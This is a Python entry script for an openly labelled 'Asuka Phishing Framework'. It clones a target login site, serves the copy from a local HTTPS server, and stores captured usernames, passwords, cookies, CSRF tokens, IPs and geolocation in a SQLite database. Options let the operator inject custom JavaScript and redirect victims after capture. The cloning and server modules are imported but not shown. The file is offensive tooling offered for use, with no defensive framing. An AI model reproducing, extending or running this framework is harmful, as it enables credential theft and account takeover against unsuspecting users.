#!/usr/bin/env python3

"""
Asuka Phishing Framework
This script is a phishing framework that clones a target website, sets up a local server,
and captures credentials and session data. It uses argparse for CLI arguments, netifaces
for IP detection, SQLite for data storage, and logging for error tracking.
"""

import argparse
import netifaces
import logging
import os
from asuka.clone import clone
from asuka.server import start_server
import threading
import sqlite3
import sys

"""
Banner displayed at script startup to show the tool's name and author.
"""
banner = r"""
    ___               __
   /   |  _______  __/ /______ _
  / /| | / ___/ / / / //_/ __ `/
 / ___ |(__  ) /_/ / ,< / /_/ /
/_/  |_/____/\__,_/_/|_|\__,_/
                - Kur0Sh1r0
"""

def get_local_ip():
    """
    Retrieves the local IP address of the machine for hosting the phishing server.
    Checks network interfaces, excluding loopback ('lo'), and prioritizes private IP
    ranges (192.168.*, 10.*, 172.*). Returns '127.0.0.1' if no suitable IP is found.
    """
    try:
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            if iface == 'lo':  # Skip loopback interface
                continue
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:  # Check for IPv4 addresses
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    # Check for private IP ranges
                    if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                        return ip
    except Exception as e:
        logging.error(f"Error getting local IP: {e}")
    return '127.0.0.1'  # Fallback to localhost

def setup_database():
    """
    Sets up a SQLite database to store captured credentials and session data.
    Creates two tables:
    - credentials: Stores login details (username, password, etc.)
    - sessions: Stores session information (IP, user agent, etc.)
    Exits the program if database setup fails.
    """
    try:
        conn = sqlite3.connect('asuka_data.db', timeout=10)  # Connect to SQLite database
        c = conn.cursor()
        # Create credentials table
        c.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            cookies TEXT,
            raw_data TEXT,
            csrf_token TEXT
        )''')
        # Create sessions table
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            user_agent TEXT,
            path TEXT,
            geolocation TEXT
        )''')
        conn.commit()  # Save changes
    except sqlite3.Error as e:
        logging.error(f"Database setup error: {e}")
        sys.exit(1)  # Exit on database error
    finally:
        conn.close()  # Always close the connection

def main():
    """
    Main function to orchestrate the phishing framework.
    Parses command-line arguments, sets up logging, clones the target website,
    initializes the database, and starts the phishing server.
    """
    # Set up argument parser for CLI options
    parser = argparse.ArgumentParser(description="Asuka Phishing Framework")
    parser.add_argument('--url', required=True, help="Target URL to clone")
    parser.add_argument('--port', type=int, default=4443, help="Port for HTTPS server")
    parser.add_argument('--host', default=None, help="Host IP address (default: auto-detect)")
    parser.add_argument('--assets', choices=['yes', 'no'], default='yes', help="Download assets (yes/no)")
    parser.add_argument('--multi-page', choices=['yes', 'no'], default='no', help="Clone linked pages (yes/no)")
    parser.add_argument('--custom-js', default='', help="Path to custom JavaScript file")
    parser.add_argument('--redirect-url', default='https://www.example.com', help="URL to redirect after credential capture")
    parser.add_argument('--show-logs', action='store_true', help="Show logs in console")
    args = parser.parse_args()

    # Configure logging to file and optionally to console
    handlers = [logging.FileHandler('error.log')]
    if args.show_logs:
        handlers.append(logging.StreamHandler())

    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=handlers
    )

    # Define user agent for HTTP requests
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    # Use provided host or auto-detect local IP
    host = args.host if args.host else get_local_ip()
    # Convert assets flag to boolean
    download_assets_flag = args.assets.lower() == 'yes'
    # Convert multi-page flag to boolean
    multi_page = args.multi_page.lower() == 'yes'

    # Display startup information
    print("[+] Starting Asuka Phishing Framework")
    print("-" * 30)
    print(f"[*] Cloning URL: {args.url}")
    print(f"[*] Host: {host}:{args.port}")
    print(f"[*] Assets: {args.assets}")
    print(f"[*] Multi-page: {args.multi_page}")
    print(f"[*] Redirect URL: {args.redirect_url}")
    print(f"[*] Show Logs: {'yes' if args.show_logs else 'no'}")
    print("-" * 30)

    # Initialize the database
    setup_database()

    # Clone the target website
    template_path = clone(
        url=args.url,
        user_agent=user_agent,
        download_assets_flag=download_assets_flag,
        multi_page=multi_page,
        custom_js=args.custom_js,
        disable_scripts=True,
        redirect_url=args.redirect_url,
        show_logs=args.show_logs
    )

    # Check if cloning was successful
    if not template_path:
        logging.error(f"Failed to clone {args.url}. Exiting.")
        sys.exit(1)

    # Start the phishing server
    start_server(host, args.port, template_path, args.redirect_url, args.show_logs)

if __name__ == "__main__":
    """
    Entry point of the script. Displays the banner and runs the main function.
    Handles KeyboardInterrupt to gracefully shut down the program.
    """
    print(f"{banner}")
    try:
        main()
    except KeyboardInterrupt as e:
        print("[-] Shutting down....")